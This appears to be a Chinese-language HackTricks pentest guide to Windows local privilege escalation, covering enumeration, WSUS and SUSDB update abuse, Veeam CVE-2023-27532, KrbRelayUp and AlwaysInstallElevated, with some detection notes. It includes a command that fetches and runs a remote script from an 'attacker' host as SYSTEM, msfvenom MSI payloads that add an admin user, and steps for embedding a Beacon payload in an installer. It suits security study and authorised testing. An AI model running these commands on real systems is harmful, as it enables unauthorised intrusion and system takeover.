# Windows 本地权限提升

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows 本地权限提升利用途径的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

本页面整合了几份基础指南中的通用 Windows 权限提升方法。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 实用的枚举流程也参考了社区研讨会和检查清单。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 历史攻击内容包括 DerbyCon 上关于 Windows 权限提升的演讲。<sup>[[5]](#references)</sup>

## Windows 基础理论

### Access Tokens

**如果你不了解 Windows access tokens，请先阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不了解 Windows 中的 integrity levels，请先阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 安全控制

Windows 中有多种机制可能**阻止你枚举系统**、运行可执行文件，甚至**检测你的活动**。开始枚举权限提升途径之前，你应该**阅读**以下**页面**并**枚举**所有这些**防御**机制：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理访问还可以将离线 UEFI NVRAM 编辑转化为启动前 DMA，并形成 Windows `SYSTEM` 内存补丁链：

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess 静默提升

通过 `RAiLaunchAdminProcess` 启动的 UIAccess 进程，在绕过 AppInfo 安全路径检查后，可被滥用以无提示地获得 High IL。请在此查看专门的 UIAccess/Admin Protection 绕过流程：

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop 辅助功能注册表传播机制可被滥用，以任意写入 SYSTEM 注册表项（RegPwn）：<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

较新的 Windows 版本还引入了 **SMB 任意端口** LPE 路径：特权本地 NTLM 身份验证会通过复用的 SMB TCP 连接进行反射：

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## 系统信息

### 版本信息枚举

检查 Windows 版本是否存在已知漏洞（也要检查已安装的补丁）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### 版本漏洞利用

这个[网站](https://msrc.microsoft.com/update-guide/vulnerability)便于搜索 Microsoft 安全漏洞的详细信息。该数据库收录了 4,700 多个安全漏洞，展示了 Windows 环境所呈现的**巨大攻击面**。

**在系统上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 内置了 watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — 收集 OS build、已安装更新和可能适用的公告；在判定结果适用之前，请核实确切的产品版本和取代旧更新的后续更新。

对于特定版本的本地 exploit，还要检查**运行中进程的架构**以及 OS 架构。在 64 位 Windows 上，32 位进程会受到 [WOW64 文件系统重定向](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)的影响：`%windir%\System32` 通常会解析到 32 位系统目录，而 `%windir%\Sysnative` 则让该进程能够访问原生系统目录。64 位进程无法使用此别名。OS build 或缺失 KB 的候选项并不能证明漏洞可利用；请将运行中的 build、已安装或取代旧更新的后续更新、进程架构以及 exploit 前提条件，与该问题对应的 [Microsoft 安全公告](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)进行比对。

服务内存损坏示例请参阅[由客户端控制的 MIDI 共享内存环形缓冲区偏移量](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions)。公布的栈偏移量仅适用于经过测试的 build；获取 `LOCAL SERVICE` 权限与后续通过 [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) 提升到 `SYSTEM` 是两回事。<sup>[[44]](#references)</sup>

**使用系统信息在本地检查**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit 的 Github 仓库：**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

环境变量中是否保存了任何凭据/Juicy 信息？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell 历史记录

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript 文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 中了解如何启用此功能。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` 只是一个示例。[PowerShell 转录策略](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) 通常会将文件写入每个用户的 Documents 文件夹，但 `OutputDirectory` 设置或 `Start-Transcript -OutputDirectory` 可以将文件重定向到共享文件夹或隐藏文件夹。查看转录文件前，请检查实际生效的输出路径和文件 ACL：文件中可能包含命令参数和输出，包括凭据。只有当可读的转录内容泄露了可用的高权限身份，且该身份能在相关上下文中登录时，它才是有价值的线索。

### PowerShell 模块日志记录

PowerShell 管道执行的详细信息会被记录下来，包括已执行的命令、命令调用以及脚本的部分内容。不过，可能不会捕获完整的执行详情和输出结果。

要启用此功能，请按照文档中“转录文件”一节的说明操作，选择 **“模块日志记录”**，而不是 **“PowerShell 转录”**。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

要查看 PowersShell 日志中的最近 15 条事件，可以执行：

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

记录脚本执行的完整活动及内容，确保每段代码块在运行时都有记录。此过程保留每项活动的完整审计轨迹，有助于取证和分析恶意行为。通过记录执行时的所有活动，可深入了解整个过程。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block 的日志事件可在 Windows 事件查看器的以下路径中找到：**应用程序和服务日志 > Microsoft > Windows > PowerShell > 操作**。\
要查看最近 20 个事件，可以使用：

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet 设置

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### 驱动器

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

前面的指南将风险概述如下：

如果更新请求使用的是 http 而不是 http**S**，就可能危及系统。

HTTP WSUS endpoint 是调查更新 metadata 是否可能被拦截的线索。能否利用还取决于客户端是否使用该 WSUS server、攻击者能否拦截或控制其流量，以及客户端的更新信任和安装策略。仅凭 URL 无法确定能否执行代码。[Microsoft 建议为 WSUS metadata 使用 TLS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

首先，在 cmd 中运行以下命令，检查网络是否使用非 SSL WSUS 更新：

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

或者在 PowerShell 中使用以下命令：

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

如果收到类似以下内容的回复：

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

并且，如果 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 或 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 的值等于 `1`。

原始的适用性说明是：

那么，**它就可以被利用。**如果最后一个注册表值等于 `0`，则 WSUS 条目会被忽略。

当 `UseWUServer` 为 `1` 时，Windows Update 会使用配置的内联网服务。这确认了 HTTP 拦截路径的一个前提条件，但并不能证明拦截、接受恶意更新或以更高权限安装是可行的。当它为 `0` 时，该策略不会选择这个特定的已配置 WSUS 端点。

要利用这些漏洞，可以使用以下工具：[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus)——这些是用于在非 SSL WSUS 流量中注入“fake”更新的 MiTM 武器化 exploit 脚本。

阅读相关研究：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**在此阅读完整报告**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本上，这是该 bug 利用的缺陷：

> 如果我们能够修改本地用户代理，并且 Windows Updates 使用 Internet Explorer 设置中配置的代理，那么我们就能够在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus) 来拦截自己的流量，并在我们的资产上以更高权限的用户身份运行代码。
>
> 此外，由于 WSUS 服务使用当前用户的设置，因此它也会使用该用户的证书存储。如果我们为 WSUS 主机名生成自签名证书，并将该证书添加到当前用户的证书存储中，就能够拦截 HTTP 和 HTTPS WSUS 流量。WSUS 没有使用类似 HSTS 的机制来实现首次使用时信任类型的证书验证。如果用户信任所提供的证书，且证书具有正确的主机名，服务就会接受它。

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) 利用此漏洞（待其发布后）。

### 由 WSUS 管理员控制的更新

当当前身份可以在 WSUS 服务器上**发布并批准**更新时，还存在另一条路径。检查该服务器上 `WSUS Administrators` 组的有效成员资格及任何委派的 WSUS 权限，然后确定会接收已批准更新的客户端计算机组。[Microsoft 要求具备 WSUS Administrator 权限才能批准更新](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)，并且[记录了发布信任关系](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)：客户端必须信任用于本地发布内容的签名证书。在将其视为提权路径之前，请确认候选更新已签名并被接受、适用于目标计算机，且是在权限更高的上下文中安装的。仅凭 HTTP `WUServer` 值或组名，并不能证明这些条件成立。

### 滥用 SUSDB 自定义更新：通过 `.txt`/`.esd` 使用未签名 payload

这与拦截 HTTP WSUS 连接是不同的信任边界失效：其前提是拥有足够权限来访问 **WSUS 数据库（`SUSDB`）存储过程**，以发布并批准自定义更新。一种实际的入口方式是将上游 WSUS 计算机帐户中继到托管 `SUSDB` 的独立 MSSQL 服务器；具体前提取决于部署，因此应先枚举 `EXECUTE` 权限，而不要假定自己拥有 SQL 管理员权限。<sup>[[38]](#references)[[39]](#references)</sup>

若要了解另一条攻击路径——将 WSUS 客户端身份验证从 HTTP/8530 中继到 LDAP、SMB 或 AD CS——请参阅[滥用 WSUS HTTP 进行 NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)。

#### 确认外部数据库中继和存储过程权限

在 WSUS 使用外部 SQL Server 的部署中，首先检查 WSUS 服务器帐户是否能够向数据库进行身份验证，以及 NTLM relay 是否能够到达该监听器。即使禁止直接写入表，服务器的 SQL 角色仍可能允许调用用于发布更新的存储过程；对 `SUSDB` 执行 `UPDATE` 失败，并不能证明发布操作被禁止。在尝试发布自定义更新之前，请在授权的 SQL 会话中检查有效身份、角色成员资格和存储过程权限。<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

实时过程定义和已安装的 `SoftwareDistributionPackage.xsd` 有助于重建有效的更新元数据。捆绑包父项和有效负载子项都需要 `UpdateIdentity`（片段类型 `1`）、`LocalizedProperties`（`4`）和 `ExtendedProperties`（`2`）；捕获每次 `spImportUpdate` 调用返回的本地修订 ID，并确保捆绑包关系、摘要、大小、内容 URL 和修订版本保持一致。这是一个有状态的发布工作流，因此，单次存储过程调用成功并不能证明客户端已执行。<sup>[[38]](#references)</sup>

#### 构建、定向并批准更新

自定义更新工作流使用合法的 WSUS 过程作为受限的发布 API。重要的状态转换如下：<sup>[[38]](#references)</sup>

| 阶段 | 相关存储过程 |
| --- | --- |
| 导入更新元数据 | `spImportUpdate` |
| 存储先决条件、已本地化和扩展的 XML 片段 | `spSaveXMLFragment` |
| 将内容摘要与攻击者控制的 URL 关联 | `spSetBatchURL` |
| 枚举/创建计算机组并添加客户端 | `spGetAllTargetGroups`、`spCreateTargetGroup`、`spGetComputerTargetByName`、`spAddComputerToTargetGroup` |
| 批准该组安装更新 | `spDeployUpdate`，其中 `@actionID = 0` 且 `@isAssigned = 1` |

文件名、摘要、大小和 `CommandLineInstallation` 处理程序必须在导入的元数据/片段中保持一致。分配内容 URL 和目标组后，最终批准操作类似如下；请使用新的更新、组和部署标识符，不要重放示例 GUID。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS 通常会拒绝任意未签名的可执行内容。但在 `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` 中，.NET 的 `VerifyFile` 路径会在所提供的文件名以 `.txt` 或 `.esd` 结尾时，将证书检查标志设为 false；此时会跳过 `CheckCertificateSignature`，且事先不会验证这些字节是否为文本或有效的 ESD 映像。因此，未作任何修改的 PE（例如命名为 `payload.exe.txt`）可以通过内容验证，之后由更新的命令行安装处理程序启动。这是策略/类型混淆漏洞，并非伪造签名。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### 兼容 BITS 的暂存与自动化

调用 `spDeployUpdate` 会使 WSUS 获取已注册的内容。源站必须满足 BITS 的 HTTP 要求：仅有可访问的 URL 并不足够，因为传输会先执行 `HEAD`/`GET` 流程，再发送字节范围请求。不支持 Range 的服务器会导致 WSUS 同步出现 `EventId=364`，并提示 BITS 要求 Range 协议标头。<sup>[[39]](#references)</sup>

研究用 PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) 会生成导入/片段/URL/组/部署链所需的 SQL，包含用于执行这些 SQL 的修改版 MSSQL 客户端，并提供用于暂存内容的 `BitsWebServer.py`。在授权实验室中，最简调用方式如下：<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 无人值守执行与重试持久化

客户端交互取决于策略。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` 中的选项 `4 - Auto download and schedule install`，会使已批准的更新按配置的计划下载并安装，无需用户手动选择。在测试中，更新仍处于失败/未完成状态的 payload，在 callback 进程退出后会立即再次被提供，因此重试行为可能形成反复执行的持久化；不过这种方式较为显眼，因为客户端会显示更新失败状态。<sup>[[39]](#references)</sup>

#### 检测与加固切入点

此攻击链中有用的服务器端和客户端切入点包括：<sup>[[39]](#references)</sup>

- 审计 `SUSDB` 中对 `spCreateTargetGroup`、`spSetBatchURL` 和 `spDeployUpdate` 的执行；调查新建的目标组、外部内容源、`.txt`/`.esd` 更新 payload，以及由意外主体（尤其是非计算机账户）执行的部署。
- 检查 `C:\Program Files\Update Services\LogFiles` 中的 `ContentSyncAgent`、`FileVerified`、拼写错误的 `FileVerficationFailed` 和 `EventId=364`；根据 payload 扩展名和内容 magic 值关联验证结果，而不要仅凭后缀判断。
- 搜寻 Windows Update 安装反复失败/重试的情况，以及以 `.txt` 或 `.esd` 命名的内容所触发的 PE 执行或异常子进程/网络活动。
- 在数据库服务支持的情况下，要求启用 Authentication 的 Extended Protection，并将数据库网络访问限制为 WSUS 服务器和获授权的管理系统。尽量减少并审计自定义更新过程上的 `EXECUTE` 权限。

## 第三方自动更新程序与 Agent IPC（本地提权）

许多企业 Agent 都提供 localhost IPC 接口和特权更新通道。如果 enrollment 能被诱导连接到攻击者的服务器，并且更新程序信任恶意 root CA 或签名者检查薄弱，本地用户就能投递恶意 MSI，由 SYSTEM 服务安装。此处提供一种通用化技术（基于 Netskope stAgentSvc 攻击链 – CVE-2025-0309）：


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（通过 TCP 9401 获取 SYSTEM 权限）

原始的特定版本描述和侦察说明如下：

Veeam B&R < `11.0.1.1261` 会在 localhost 上开放一个 **TCP/9401** 服务，用于处理攻击者控制的消息，从而允许以 **NT AUTHORITY\SYSTEM** 身份执行任意命令。<sup>[[12]](#references)</sup>

- **侦察**：确认监听端口和版本，例如运行 `netstat -ano | findstr 9401` 和 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。

Veeam Backup & Replication 和 Cloud Connect 默认使用 **TCP/9401** 上的核心备份服务。[Veeam 的公告](https://www.veeam.com/kb4424)描述了在备份网络边界内无需身份验证即可泄露加密的配置数据库凭据；另有一个公开 PoC 展示了以 **NT AUTHORITY\SYSTEM** 身份执行命令的攻击路径。<sup>[[12]](#references)</sup>该服务的绑定地址可能不限于 localhost，因此请检查其实际地址和 PID。

- **侦察**：确认 TCP/9401 属于 `Veeam.Backup.Service.exe`，然后检查已安装的产品和补丁元数据。`netstat -ano | findstr 9401` 和 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` 只能作为线索，不能完整确认补丁状态。
- **修复版本下限**：Veeam 将 **11a build 11.0.1.1261 P20230227** 和 **12 build 12.0.0.1420 P20230223** 列为首批已修复版本；更早的版本均受影响。仅凭四段式文件版本无法区分未打补丁的基础版本与同一 build 编号上后续安装的补丁。将补丁标识与[供应商的 build 历史](https://www.veeam.com/kb2680)核对后，再判定边界 build 是否已修复。
- **利用**：将 `VeeamHax.exe` 等 PoC 与所需的 Veeam DLL 放在同一目录，然后通过本地 socket 触发 SYSTEM payload：

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

该服务以 SYSTEM 身份执行命令。

引用的 PoC 演示了在满足其额外前提条件时以 SYSTEM 身份执行命令；供应商的公告描述了凭据泄露问题。

## KrbRelayUp

原始的默认环境描述如下：

在特定条件下，Windows **域**环境中存在**本地权限提升**漏洞。这些条件包括：环境中**未强制实施 LDAP signing，**用户拥有允许其配置**基于资源的约束委派（RBCD）**的自身权限，并且用户能够在域中创建计算机。需要注意的是，使用**默认设置**即可满足这些**要求**。

当合适的 COM 服务器进行身份验证，且被中继的主体对目标对象拥有权限时，本地 Kerberos relay 可以将权限较低的登录会话提升为具有特权的目录写入操作。[KrbRelay 文档](https://github.com/cube0x0/KrbRelay)介绍了 RBCD 和 `msDS-KeyCredentialLink`（shadow-credential）LDAP 写入；KrbRelayUp 可自动化其中一些路径。RBCD 链需要适用的委派权限和目标对象权限，而 shadow-credential 链则需要 key-credential 写入权限，以及支持证书身份验证路径的 KDC。仅凭域成员身份并不能满足这两种路径的条件。

检查实际 DC 的 [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) 和 [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) 策略、被中继身份的对象 ACL，以及所选 COM 类的身份验证和模拟级别。调用者的登录类型和凭据上下文也很重要：WinRM 会话的行为可能不同于交互式登录或新凭据登录。防火墙/OXID 路由和已安装的更新也可能影响结果。将宽松的策略或匹配的 ACL 视为需要审查的对象；被动枚举不应触发 COM coercion、中继身份验证或目录写入。机器帐户的 shadow credential 可能会获得机器票据；只有当该帐户拥有所需的目录复制权限时，才可能进一步通过独立的 DCSync 路径操作。

在 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 中查找 **exploit**

有关攻击流程的更多信息，请查看 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**如果**这 2 个注册表项处于**启用**状态（值为 **0x1**），那么任何权限级别的用户都可以将 `*.msi` 文件作为 NT AUTHORITY\\**SYSTEM** 身份**安装**（执行）。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

如果你有 meterpreter session，可以使用模块 **`exploit/windows/local/always_install_elevated`** 自动执行此技术。

### PowerUP

使用 PowerUP 中的 `Write-UserAddMSI` 命令，在当前目录中创建用于提升权限的 Windows MSI 二进制文件。此脚本会写出一个预编译的 MSI 安装程序，用于提示添加用户/组（因此你需要 GIU 访问权限）：

```
Write-UserAddMSI
```

只需执行创建的二进制文件即可提升权限。

### MSI Wrapper

阅读本教程，了解如何使用这些工具创建 MSI wrapper。注意，如果你**只是**想要**执行** **命令行**，可以将一个“**.bat**”文件打包进去。


{{#ref}}
msi-wrapper.md
{{#endref}}

### 使用 WIX 创建 MSI


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### 使用 Visual Studio 创建 MSI

- 使用 Cobalt Strike 或 Metasploit 在 `C:\privesc\beacon.exe` 中生成一个新的 Windows EXE TCP payload。
- 打开 **Visual Studio**，选择 **Create a new project**，并在搜索框中输入“installer”。选择 **Setup Wizard** 项目，然后点击 **Next**。
- 为项目命名，例如 **AlwaysPrivesc**，将位置设为 **`C:\privesc`**，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 持续点击 **Next**，直到进入第 3 步（共 4 步，选择要包含的文件）。点击 **Add** 并选择刚生成的 Beacon payload，然后点击 **Finish**。
- 在 **Solution Explorer** 中选中 **AlwaysPrivesc** 项目，并在 **Properties** 中将 **TargetPlatform** 从 **x86** 改为 **x64**。
  - 还可以更改其他属性，例如 **Author** 和 **Manufacturer**，让安装后的应用看起来更可信。
- 右键点击该项目，选择 **View > Custom Actions**。
- 右键点击 **Install**，然后选择 **Add Custom Action**。
- 双击 **Application Folder**，选择 **beacon.exe** 文件，然后点击 **OK**。这样可以确保安装程序运行时立即执行 Beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- 最后，**构建项目**。
  - 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保已将平台设为 x64。

### MSI 安装

要在**后台**执行恶意 `.msi` 文件的**安装**：

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

要利用此漏洞，可以使用：_exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### 审计设置

这些设置决定了哪些内容会被**记录**，因此你应该留意它们

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding，了解日志发送到哪里很有用。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** 专为**管理本地 Administrator 密码**而设计，确保加入域的计算机上每个密码都**独一无二、随机生成并定期更新**。这些密码会安全地存储在 Active Directory 中，只有通过 ACL 获得足够权限的用户才能访问，从而在获得授权后查看本地管理员密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果已启用，**明文密码会存储在 LSASS**（Local Security Authority Subsystem Service）中。\
[**本页面提供有关 WDigest 的更多信息**](../stealing-credentials/credentials-protections.md#wdigest)。

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA 保护

从 **Windows 8.1** 开始，Microsoft 引入了针对本地安全机构 (LSA) 的增强保护，以**阻止**不受信任的进程尝试**读取其内存**或注入代码，进一步增强系统安全性。\
[**此处了解有关 LSA Protection 的更多信息**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** 于 **Windows 10** 中引入，旨在保护设备上存储的凭据，抵御 pass-the-hash 等威胁。[**此处提供有关 Credential Guard 的更多信息。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### 缓存凭据

**域凭据**由**本地安全机构**（LSA）进行身份验证，并由操作系统组件使用。当用户的登录数据通过已注册的安全包进行身份验证后，通常会为该用户建立域凭据。\
[**此处了解有关缓存凭据的更多信息**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## 用户与组

### 枚举用户与组

你应该检查自己所属的组是否拥有有趣的权限。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特权组

如果你**属于某个特权组，可能就能够提升权限**。在此了解特权组，以及如何滥用它们来提升权限：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

在此页面**了解更多**关于 **token** 的信息：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
查看以下页面，**了解有趣的 token** 以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

